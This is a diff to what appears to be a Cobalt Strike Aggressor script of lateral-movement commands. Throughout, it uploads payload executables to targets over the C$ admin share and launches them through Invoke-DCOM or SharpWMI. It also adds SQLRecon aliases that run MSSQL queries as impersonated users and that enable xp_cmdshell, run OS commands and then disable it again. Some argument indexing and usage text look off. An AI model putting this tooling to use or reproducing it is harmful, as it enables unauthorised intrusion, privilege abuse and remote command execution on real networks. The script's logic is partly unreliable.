@@ -66,12 +66,12 @@ sub invoke_dcom
     $filename = rand_alphanum(4) . ".exe";
 
     #upload payload to target
-    bupload_raw($1, "\\\\ $+ $2 $+ \\C$\\Windows\\Temp\\ $+ $filename $+ ", $payload);
+    bupload_raw($1, "\\\\ $+ $2 $+ \\C$\\Windows\\ $+ $filename $+ ", $payload);
 
     println("Invoke-DCOM Oneliner: " . $oneliner);
     println("Filename: ". $filename);
     #execute script from powerpick
-    bpowerpick($1, "Invoke-DCOM -ComputerName  $+ $2 $+  -Method MMC20.Application -Command C:\\Windows\\Temp\\ $+ $filename $+ ", $oneliner);
+    bpowerpick($1, "Invoke-DCOM -ComputerName  $+ $2 $+  -Method MMC20.Application -Command C:\\Windows\\ $+ $filename $+ ", $oneliner);
 
     #link if p2p beacon
     beacon_link($1, $2, $3);
@@ -115,7 +115,7 @@ sub sharpwmi
     $filename = rand_alphanum(4) . ".exe";
 
     #upload payload to target
-    $uploadpath = "\\\\ $+ $2 $+ \\C$\\Windows\\Temp\\ $+ $filename $+ ";
+    $uploadpath = "\\\\ $+ $2 $+ \\C$\\Windows\\ $+ $filename $+ ";
     println("Uploading binary to:" . $uploadpath);
     bupload_raw($1, $uploadpath, $payload);
 
@@ -713,8 +713,61 @@ beacon_command_register(
     "mssql_query",
     "Use SQLRecon to run query against an instance",
     "Usage:\n"
-    . "mssql_accesstestuser [instance] [query]\n"
-    . "mssql_accesstestuser [instance] [domain] [user] [password] [query]"
+    . "mssql_query [instance] [query]\n"
+    . "mssql_query [instance] [domain] [user] [password] [query]"
+);
+
+alias mssql_iquery {
+    $size = size(@_);
+
+    $args = "";
+    if ($size == 4)
+    {
+        #[instance] [Impersonated User] [query]
+        $instance   = @_[1];
+        $impaccount = @_[2];
+        $query      = @_[3];
+
+        $args = "/a:wintoken /m:iquery "
+        . " /h:" . $instance
+        . " /i:" . $impaccount
+        . " /c:\"" . $query . "\"";
+        println("mssql_iquery - args = " . $args);
+
+    }
+    else if ($size == 7)
+    {
+        $instance   = @_[1];
+        $domain     = @_[2];
+        $user       = @_[3];
+        $password   = @_[4];
+        $impaccount = @_[5];
+        $query      = @_[6];
+
+        $args = "/a:windomain /m:iquery"
+        . " /h:" . $instance
+        . " /d:" . $domain
+        . " /u:" . $user
+        . " /p:" . $password
+        . " /i:" . $impaccount
+        . " /c:\"" . $query . "\"";
+        println("mssql_iquery - args = " . $args);
+
+    }
+    else
+    {
+        berror($1, "Invalid parameters specified.");
+        return;
+    }
+    
+    bexecute_assembly($1, $SQLRECON_PATH, $args );
+}
+beacon_command_register(
+    "mssql_iquery",
+    "Use SQLRecon to run query against an instance",
+    "Usage:\n"
+    . "mssql_iquery [instance] [Impersonated User] [query]\n"
+    . "mssql_iquery [instance] [domain] [user] [password] [Impersonated User] [query]"
 );
 
 alias mssql_checkimpersonation {
@@ -763,7 +816,6 @@ sub mssql_checkimpersonation_cb {
     
     $query = "SELECT name, principal_id, type_desc, is_disabled FROM sys.server_principals WHERE principal_id =  $+ $grantor $+  OR principal_id =  $+ $grantee $+ ;";
     bexecute_assembly($1, $SQLRECON_PATH, $args . " /c:\"" . $query . "\"");
-
 }
 beacon_command_register(
     "mssql_checkimpersonation",
@@ -771,4 +823,129 @@ beacon_command_register(
     "Usage:\n"
     . "mssql_checkimpersonation [instance]\n"
     . "mssql_checkimpersonation [instance] [domain] [user] [password]"
+);
+
+alias mssql_impersonatecommand {
+    $size       = size(@_);
+
+    $args = "";
+    if ($size == 4)
+    {
+        # [instance] [impersonating account] [module]
+        $instance   = @_[1];
+        $impaccount = @_[2];
+        $module     = @_[3];
+
+        $args = "/a:wintoken"
+        . " /m:" . $module
+        . " /h:" . $instance
+        . " /i:\"" . $impaccount . "\"";
+        println("mssql_impersonatecommand - args = " . $args);
+
+    }
+    else if ($size == 6)
+    {
+        # [instance] [Auth domain] [Auth user] [Auth password] [impersonating account] [module]
+        $instance   = @_[1];
+        $domain     = @_[2];
+        $user       = @_[3];
+        $password   = @_[4];
+        $impaccount = @_[5];
+        $module     = @_[6];
+
+        $args = "/a:windomain"
+        . " /m:" . $module
+        . " /h:" . $instance
+        . " /d:" . $domain
+        . " /u:" . $user
+        . " /p:" . $password
+        . " /i:\"" . $impaccount . "\"";
+        println("mssql_impersonatecommand - args = " . $args);
+
+    }
+    else
+    {
+        berror($1, "Invalid parameters specified.");
+        return;
+    }
+    
+    bexecute_assembly($1, $SQLRECON_PATH, $args);
+}
+beacon_command_register(
+    "mssql_impersonatecommand",
+    "Use SQLRecon to run impersionated module against an instance",
+    "Usage:\n"
+    . "mssql_impersonatecommand [instance] [impersonating account] [module]\n"
+    . "mssql_impersonatecommand [instance] [Auth domain] [Auth user] [Auth password] [impersonating account] [module]"
+);
+
+sub mssql_irunoscmd_cb2 {
+    #($1, $2, $3, $args)
+    blog($1, $2);
+    $args = $4;
+    println("$4 = " . $4);
+    bexecute_assembly($1, $SQLRECON_PATH, $args . " /m:idisablexp");
+}
+sub mssql_irunoscmd_cb1 {
+    #($1, $2, $3, $args, $command)
+    blog($1, $2);
+    $args = $4;
+    $command = $5;
+    $cb1_args = $args . " /m:ixpcmd /c:" . $command;
+
+    bexecute_assembly($1, $SQLRECON_PATH, $cb1_args, $null, lambda({ mssql_irunoscmd_cb2 ($1, $2, $3, $args); }));
+}
+alias mssql_irunoscmd {
+    $size = size(@_);
+
+    $args = "";
+    if ($size == 4)
+    {
+        # [instance] [impersonating account] [command]
+        $instance   = @_[1];
+        $impaccount = @_[2];
+        $command    = @_[3];
+
+        $args = "/a:wintoken"
+        . " /h:" . $instance
+        . " /i:" . $impaccount;
+        println("mssql_impersonatecommand - args = " . $args);
+
+    }
+    else if ($size == 6)
+    {
+        # [instance] [Auth domain] [Auth user] [Auth password] [impersonating account] [command]
+        $instance   = @_[1];
+        $domain     = @_[2];
+        $user       = @_[3];
+        $password   = @_[4];
+        $impaccount = @_[5];
+        $command    = @_[6];
+
+        $args = "/a:windomain"
+        . " /h:" . $instance
+        . " /d:" . $domain
+        . " /u:" . $user
+        . " /p:" . $password
+        . " /i:" . $impaccount;
+        println("mssql_irunoscmd - args = " . $args);
+
+    }
+    else
+    {
+        berror($1, "Invalid parameters specified.");
+        return;
+    }
+    
+    bexecute_assembly($1, $SQLRECON_PATH, $args . " /m:ienablexp", $null, lambda({ mssql_irunoscmd_cb1 ($1, $2, $3, $args, $command); }));
+}
+beacon_command_register(
+    "mssql_irunoscmd",
+    "Use SQLRecon to run impersionated OS command against an instance",
+    "Use SQLRecon to run impersionated OS command against an instance
+This command will enable XPCMD, run the command, then disable it.
+
+Usage:\n"
+    . "mssql_irunoscmd [instance] [impersonating account] [module]\n"
+    . "mssql_irunoscmd [instance] [Auth domain] [Auth user] [Auth password] [impersonating account] [module]"
 );
